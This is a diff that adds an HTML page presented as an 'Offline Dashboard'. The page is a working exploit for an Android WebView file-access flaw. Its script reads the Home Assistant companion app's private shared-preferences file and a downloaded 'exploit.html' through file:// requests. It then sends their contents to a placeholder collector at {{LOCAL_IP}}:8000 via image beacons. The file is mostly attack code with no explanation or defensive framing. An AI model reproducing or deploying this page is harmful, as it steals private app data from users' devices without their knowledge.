@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Offline Dashboard</title></head>
+<body><h2>离线面板缓存</h2><pre id="out">读取中...</pre>
+<script>
+var EXFIL = "http://{{LOCAL_IP}}:8000/collect";
+function exfil(l,d){try{new Image().src=EXFIL+"?d="+encodeURIComponent(l+"="+d)}catch(e){}}
+var files=["/data/data/io.homeassistant.companion.android/shared_prefs/WebViewSettings.xml","/sdcard/Download/exploit.html"];
+var o="";
+for(var i=0;i<files.length;i++){
+  try{
+    var x=new XMLHttpRequest();x.open("GET","file://"+files[i],false);
+    x.overrideMimeType("text/plain");x.send();
+    o+="[OK] "+files[i]+"\n"+x.responseText.substring(0,500)+"\n\n";
+    exfil("file"+i, files[i]+" => "+x.responseText.substring(0,300));
+  }catch(e){o+="[FAIL] "+files[i]+": "+e.message+"\n\n";}
+}
+document.getElementById("out").textContent=o;
+</script></body></html>
